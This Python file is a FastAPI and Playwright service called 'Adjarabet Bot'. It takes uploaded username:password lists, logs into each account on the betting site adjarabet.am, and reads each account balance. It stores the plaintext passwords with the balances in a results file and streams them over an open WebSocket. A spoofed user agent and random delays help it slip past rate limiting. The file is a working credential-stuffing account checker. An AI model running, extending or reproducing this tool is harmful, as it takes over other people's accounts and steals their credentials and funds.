import asyncio
import json
import logging
import os
import random
import re
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import List, Optional, Dict, Any
from contextlib import asynccontextmanager

import aiofiles
import aiohttp
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

# ================= PRODUCTION CONFIG =================
PRODUCTION_CONFIG = {
    "log_level": os.getenv("LOG_LEVEL", "INFO"),
    "port": int(os.getenv("PORT", 8000)),
    "host": os.getenv("HOST", "0.0.0.0"),
    "max_concurrency": int(os.getenv("MAX_CONCURRENCY", 1)),  # Reduced for server stability
    "headless": os.getenv("HEADLESS", "true").lower() == "true",
    "timeout": int(os.getenv("TIMEOUT", 30000)),  # 30 seconds
    "max_retries": int(os.getenv("MAX_RETRIES", 1)),  # Single retry only
    "results_dir": os.getenv("RESULTS_DIR", "results"),
    "log_file": os.getenv("LOG_FILE", "logs/bot.log"),
    "browser_type": os.getenv("BROWSER_TYPE", "chromium"),
    "browser_instances": int(os.getenv("BROWSER_INSTANCES", 1)),  # Single browser instance
}

# ================= PRODUCTION LOGGER =================
class ProductionLogger:
    def __init__(self):
        Path("logs").mkdir(exist_ok=True)
        
        self.logger = logging.getLogger("AdjarabetBot")
        self.logger.setLevel(getattr(logging, PRODUCTION_CONFIG["log_level"]))
        
        # Clear existing handlers
        self.logger.handlers.clear()
        
        # File handler
        file_handler = logging.FileHandler(PRODUCTION_CONFIG["log_file"], encoding="utf-8")
        console_handler = logging.StreamHandler()
        
        formatter = logging.Formatter(
            "%(asctime)s | %(levelname)s | %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S"
        )
        
        file_handler.setFormatter(formatter)
        console_handler.setFormatter(formatter)
        
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)
    
    def info(self, msg): self.logger.info(msg)
    def error(self, msg): self.logger.error(msg)
    def warning(self, msg): self.logger.warning(msg)
    def debug(self, msg): self.logger.debug(msg)

# ================= ENUMS =================
class AccountStatus(Enum):
    SUCCESS = "✅"
    FAILED = "❌"
    TIMEOUT = "⏰"
    BLOCKED = "🚫"

# ================= DATA =================
@dataclass
class Account:
    username: str
    password: str
    status: AccountStatus = AccountStatus.FAILED
    balance: str = ""
    balance_value: float = 0.0
    error: str = ""
    timestamp: str = ""
    
    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()

# ================= SIMPLE METRICS =================
class SimpleMetrics:
    def __init__(self):
        self.total = 0
        self.successful = 0
        self.failed = 0
        self.start_time = None
    
    def start(self):
        self.start_time = datetime.now()
    
    def record(self, success: bool):
        self.total += 1
        if success:
            self.successful += 1
        else:
            self.failed += 1
    
    def get_rate(self) -> float:
        if self.total == 0:
            return 0
        return (self.successful / self.total) * 100

# ================= CONNECTION MANAGER =================
class ConnectionManager:
    def __init__(self):
        self.active_connections: set = set()

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.add(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.discard(websocket)

    async def broadcast(self, message: str):
        for conn in list(self.active_connections):
            try:
                await conn.send_text(message)
            except:
                self.disconnect(conn)

# ================= SIMPLIFIED BOT =================
class SimpleBot:
    def __init__(self):
        self.log = ProductionLogger()
        self.pw = None
        self.browser = None
        self.context = None
        self._running = False
        self.metrics = SimpleMetrics()
        self.login_url = "https://www.adjarabet.am/hy"
    
    async def start(self):
        """Start browser once and reuse"""
        try:
            self.log.info("Starting browser...")
            self.pw = await async_playwright().start()
            
            # Launch browser
            self.browser = await self.pw.chromium.launch(
                headless=PRODUCTION_CONFIG["headless"],
                args=[
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--single-process',  # Reduce memory usage
                ]
            )
            
            # Create single context
            self.context = await self.browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                ignore_https_errors=True
            )
            
            self._running = True
            self.log.info("Browser started successfully")
            
        except Exception as e:
            self.log.error(f"Failed to start browser: {e}")
            raise
    
    async def stop(self):
        """Clean shutdown"""
        self._running = False
        
        if self.context:
            try:
                await self.context.close()
            except:
                pass
        
        if self.browser:
            try:
                await self.browser.close()
            except:
                pass
        
        if self.pw:
            try:
                await self.pw.stop()
            except:
                pass
        
        self.log.info("Bot stopped")
    
    async def login_single(self, account: Account) -> Account:
        """Login with single account - optimized version"""
        page = None
        
        try:
            # Create new page in existing context
            page = await self.context.new_page()
            page.set_default_timeout(PRODUCTION_CONFIG["timeout"])
            
            # Navigate to site
            try:
                await page.goto(self.login_url, wait_until="domcontentloaded", timeout=15000)
            except PlaywrightTimeout:
                account.status = AccountStatus.TIMEOUT
                account.error = "Navigation timeout"
                return account
            
            await asyncio.sleep(random.uniform(0.5, 1.0))
            
            # Check if already logged in
            try:
                balance_el = await page.wait_for_selector(
                    '[data-test-id="header-user-balance"]', 
                    timeout=3000
                )
                if balance_el:
                    balance_text = await balance_el.inner_text()
                    account.balance = balance_text
                    account.balance_value = self._parse_balance(balance_text)
                    account.status = AccountStatus.SUCCESS
                    self.log.info(f"✅ {account.username} | {balance_text}")
                    return account
            except:
                pass  # Not logged in
            
            # Login process
            try:
                await page.wait_for_selector('input[name="userIdentifier"]', timeout=10000)
                await page.fill('input[name="userIdentifier"]', account.username)
                await asyncio.sleep(0.5)
                
                await page.fill('input[type="password"]', account.password)
                await asyncio.sleep(0.5)
                
                await page.click('[data-test-id="header-login-button"]')
                
                # Wait for balance
                balance_el = await page.wait_for_selector(
                    '[data-test-id="header-user-balance"]', 
                    timeout=15000
                )
                
                balance_text = await balance_el.inner_text()
                account.balance = balance_text
                account.balance_value = self._parse_balance(balance_text)
                account.status = AccountStatus.SUCCESS
                
                self.log.info(f"✅ {account.username} | {balance_text}")
                return account
                
            except PlaywrightTimeout:
                account.status = AccountStatus.TIMEOUT
                account.error = "Login timeout"
                return account
                
        except Exception as e:
            account.status = AccountStatus.FAILED
            account.error = str(e)[:100]
            self.log.error(f"❌ {account.username}: {str(e)[:80]}")
            return account
            
        finally:
            if page:
                try:
                    await page.close()
                except:
                    pass
    
    def _parse_balance(self, text: str) -> float:
        """Parse balance text to float"""
        try:
            match = re.search(r'[\d,]+\.?\d*', text.replace(',', ''))
            if match:
                return float(match.group())
        except:
            pass
        return 0.0
    
    async def process_accounts(self, accounts: List[Account], websocket_manager: ConnectionManager):
        """Process all accounts sequentially (not parallel) to avoid server overload"""
        self.metrics.start()
        self._running = True
        
        results = []
        
        # Clear previous results
        results_file = Path(PRODUCTION_CONFIG["results_dir"]) / "results.json"
        results_file.parent.mkdir(exist_ok=True)
        
        total = len(accounts)
        
        self.log.info(f"📊 Processing {total} accounts sequentially")
        await websocket_manager.broadcast(f"INFO: Processing {total} accounts")
        
        for i, account in enumerate(accounts, 1):
            if not self._running:
                break
            
            # Process single account
            result = await self.login_single(account)
            results.append(result)
            self.metrics.record(result.status == AccountStatus.SUCCESS)
            
            # Save results incrementally
            await self._save_results(results)
            
            # Broadcast progress
            await websocket_manager.broadcast(f"PROGRESS:{i}/{total}")
            
            # Broadcast result
            result_data = {
                "username": result.username,
                "password": result.password,
                "balance": result.balance,
                "balance_value": result.balance_value,
                "status": result.status.value,
                "error": result.error
            }
            await websocket_manager.broadcast(f"RESULT:{json.dumps(result_data)}")
            
            # Delay between requests to avoid rate limiting
            await asyncio.sleep(random.uniform(1, 2))
        
        # Send summary
        rate = self.metrics.get_rate()
        summary = f"SUMMARY:{self.metrics.successful}/{self.metrics.total}:{rate:.1f}"
        await websocket_manager.broadcast(summary)
        
        self.log.info(f"📈 Completed: {self.metrics.successful}/{self.metrics.total} ({rate:.1f}%)")
        
        return results
    
    async def _save_results(self, results: List[Account]):
        """Save results to JSON file"""
        try:
            data = [
                {
                    "username": acc.username,
                    "password": acc.password,
                    "balance": acc.balance,
                    "balance_value": acc.balance_value,
                    "status": acc.status.value,
                    "error": acc.error,
                    "timestamp": acc.timestamp
                }
                for acc in results
            ]
            
            results_file = Path(PRODUCTION_CONFIG["results_dir"]) / "results.json"
            async with aiofiles.open(results_file, "w", encoding="utf-8") as f:
                await f.write(json.dumps(data, indent=2, ensure_ascii=False))
        except Exception as e:
            self.log.error(f"Failed to save results: {e}")

# ================= ACCOUNT LOADER =================
class AccountLoader:
    @staticmethod
    def load(content: str) -> List[Account]:
        """Load accounts from text content"""
        accounts = []
        
        for line in content.splitlines():
            line = line.strip()
            if line and not line.startswith('#'):
                if ':' in line:
                    parts = line.split(':', 2)
                    username = parts[0].strip()
                    password = parts[1].strip()
                    if username and password:
                        accounts.append(Account(username, password))
        
        return accounts

# ================= FASTAPI APP =================
manager = ConnectionManager()
bot: Optional[SimpleBot] = None
processing_task: Optional[asyncio.Task] = None

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    logger = ProductionLogger()
    logger.info("=" * 50)
    logger.info("ADJARABET BOT v11.0 - OPTIMIZED")
    logger.info("=" * 50)
    
    yield
    
    # Shutdown
    global bot, processing_task
    
    if processing_task and not processing_task.done():
        processing_task.cancel()
        try:
            await processing_task
        except:
            pass
    
    if bot:
        await bot.stop()

app = FastAPI(
    title="Adjarabet Bot API",
    version="11.0",
    lifespan=lifespan
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/")
async def root():
    return {
        "status": "running",
        "version": "11.0",
        "optimized": True,
        "sequential_processing": True
    }

@app.post("/start")
async def start_bot(request: Request):
    global bot, processing_task
    
    try:
        # Get accounts from request
        body = await request.body()
        accounts_content = body.decode("utf-8")
        
        if not accounts_content.strip():
            return JSONResponse(
                {"status": "error", "message": "No accounts provided"},
                status_code=400
            )
        
        # Load accounts
        accounts = AccountLoader.load(accounts_content)
        
        if not accounts:
            return JSONResponse(
                {"status": "error", "message": "No valid accounts found"},
                status_code=400
            )
        
        # Stop existing bot if running
        if processing_task and not processing_task.done():
            processing_task.cancel()
            try:
                await processing_task
            except:
                pass
        
        if bot:
            await bot.stop()
        
        # Create and start new bot
        bot = SimpleBot()
        await bot.start()
        
        # Start processing in background
        async def run_processing():
            try:
                await manager.broadcast("STATUS:started")
                await bot.process_accounts(accounts, manager)
                await manager.broadcast("STATUS:completed")
            except asyncio.CancelledError:
                await manager.broadcast("STATUS:stopped")
            except Exception as e:
                logger = ProductionLogger()
                logger.error(f"Processing error: {e}")
                await manager.broadcast(f"ERROR:{str(e)}")
                await manager.broadcast("STATUS:stopped")
            finally:
                # Clean up bot after processing
                if bot:
                    await bot.stop()
        
        processing_task = asyncio.create_task(run_processing())
        
        return {
            "status": "started",
            "message": f"Bot started with {len(accounts)} accounts",
            "total_accounts": len(accounts)
        }
        
    except Exception as e:
        return JSONResponse(
            {"status": "error", "message": str(e)},
            status_code=500
        )

@app.post("/stop")
async def stop_bot():
    global processing_task, bot
    
    if processing_task and not processing_task.done():
        processing_task.cancel()
        try:
            await processing_task
        except:
            pass
        processing_task = None
    
    if bot:
        await bot.stop()
        bot = None
    
    await manager.broadcast("STATUS:stopped")
    
    return {"status": "stopped"}

@app.get("/results")
async def get_results():
    """Get current results"""
    try:
        results_file = Path(PRODUCTION_CONFIG["results_dir"]) / "results.json"
        if results_file.exists():
            async with aiofiles.open(results_file, "r", encoding="utf-8") as f:
                content = await f.read()
                return json.loads(content) if content else []
    except Exception as e:
        print(f"Error reading results: {e}")
    
    return []

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "bot_running": bot is not None and bot._running,
        "timestamp": datetime.now().isoformat()
    }

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket for real-time updates"""
    await manager.connect(websocket)
    try:
        while True:
            try:
                data = await asyncio.wait_for(websocket.receive_text(), timeout=30)
                if data == "ping":
                    await websocket.send_text("pong")
            except asyncio.TimeoutError:
                # Send keep-alive ping
                try:
                    await websocket.send_text("ping")
                except:
                    break
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

if __name__ == "__main__":
    import uvicorn
    
    # Create necessary directories
    Path(PRODUCTION_CONFIG["results_dir"]).mkdir(exist_ok=True)
    Path("logs").mkdir(exist_ok=True)
    
    print("=" * 50)
    print("ADJARABET BOT v11.0 - OPTIMIZED")
    print("=" * 50)
    print(f"Browser: {PRODUCTION_CONFIG['browser_type']}")
    print(f"Concurrency: SEQUENTIAL (1 account at a time)")
    print(f"Headless: {PRODUCTION_CONFIG['headless']}")
    print(f"Server: http://{PRODUCTION_CONFIG['host']}:{PRODUCTION_CONFIG['port']}")
    print("=" * 50)
    print("OPTIMIZATIONS:")
    print("✓ Single browser instance")
    print("✓ Sequential processing")
    print("✓ Reduced memory usage")
    print("✓ Proper resource cleanup")
    print("=" * 50)
    
    uvicorn.run(
        app,
        host=PRODUCTION_CONFIG["host"],
        port=PRODUCTION_CONFIG["port"],
        log_level=PRODUCTION_CONFIG["log_level"].lower(),
        access_log=False
    )
